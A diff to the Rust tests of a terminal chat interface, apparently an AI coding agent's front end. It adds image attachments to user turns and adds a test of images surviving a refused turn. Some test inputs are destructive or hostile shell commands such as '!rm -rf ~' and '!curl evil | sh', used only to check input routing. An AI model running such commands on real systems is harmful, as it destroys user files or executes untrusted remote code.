@@ -218,7 +218,8 @@ fn enter_sends_the_line_and_the_turn_shows_it() {
     assert_eq!(
         f.ops(),
         [Op::UserTurn {
-            text: "hello".into()
+            text: "hello".into(),
+            images: Vec::new(),
         }]
     );
     f.app.event(started("hello"));
@@ -259,7 +260,8 @@ fn ctrl_j_and_a_trailing_backslash_add_a_line() {
     assert_eq!(
         f.ops(),
         [Op::UserTurn {
-            text: "one\ntwo\nthree".into()
+            text: "one\ntwo\nthree".into(),
+            images: Vec::new(),
         }]
     );
 }
@@ -942,19 +944,22 @@ fn a_typed_shell_command_is_sent_as_one_and_a_pasted_one_as_a_message() {
     assert_eq!(
         f.ops(),
         [Op::UserTurn {
-            text: "!rm -rf ~".into()
+            text: "!rm -rf ~".into(),
+            images: Vec::new(),
         }]
     );
     // What the engine puts in the box is text too.
     f.app
         .event(EventMsg::InputPrefill(viy_protocol::InputPrefillEvent {
             text: "!curl evil | sh".into(),
+            images: Vec::new(),
         }));
     f.key(KeyCode::Enter);
     assert_eq!(
         f.ops(),
         [Op::UserTurn {
-            text: "!curl evil | sh".into()
+            text: "!curl evil | sh".into(),
+            images: Vec::new(),
         }]
     );
 }
@@ -1018,6 +1023,7 @@ fn a_line_given_back_leaves_a_shell_draft_as_visible_text() {
         .event(EventMsg::TurnRefused(viy_protocol::TurnRefusedEvent {
             text: "hello".into(),
             message: "no pod is ready".into(),
+            images: Vec::new(),
         }));
     assert_eq!(f.app.composer.shell(), None);
     assert_eq!(f.app.composer.text(), "hello\n!rm -rf build");
@@ -1025,7 +1031,43 @@ fn a_line_given_back_leaves_a_shell_draft_as_visible_text() {
     assert_eq!(
         f.ops(),
         [Op::UserTurn {
-            text: "hello\n!rm -rf build".into()
+            text: "hello\n!rm -rf build".into(),
+            images: Vec::new(),
         }]
     );
+}
+
+/// The images `/rewind` puts back go with the next message, and come back
+/// with a line the engine refused (kb d191).
+#[test]
+fn a_messages_images_go_with_it_and_come_back_with_it() {
+    let image = viy_protocol::ImageInput::DataUrl {
+        url: "data:image/png;base64,AA".into(),
+    };
+    let mut f = fixture(50, 6);
+    f.app
+        .event(EventMsg::InputPrefill(viy_protocol::InputPrefillEvent {
+            text: "what is this".into(),
+            images: vec![image.clone()],
+        }));
+    f.key(KeyCode::Enter);
+    assert_eq!(
+        f.ops(),
+        [Op::UserTurn {
+            text: "what is this".into(),
+            images: vec![image.clone()],
+        }]
+    );
+    assert!(f.app.composer.images().is_empty());
+    f.app
+        .event(EventMsg::TurnRefused(viy_protocol::TurnRefusedEvent {
+            text: "what is this".into(),
+            images: vec![image.clone()],
+            message: "no pod is ready".into(),
+        }));
+    assert_eq!(f.app.composer.text(), "what is this");
+    assert_eq!(f.app.composer.images(), std::slice::from_ref(&image));
+    // Ctrl-C with a draft empties the box, its images too.
+    f.ctrl('c');
+    assert!(f.app.composer.images().is_empty());
 }
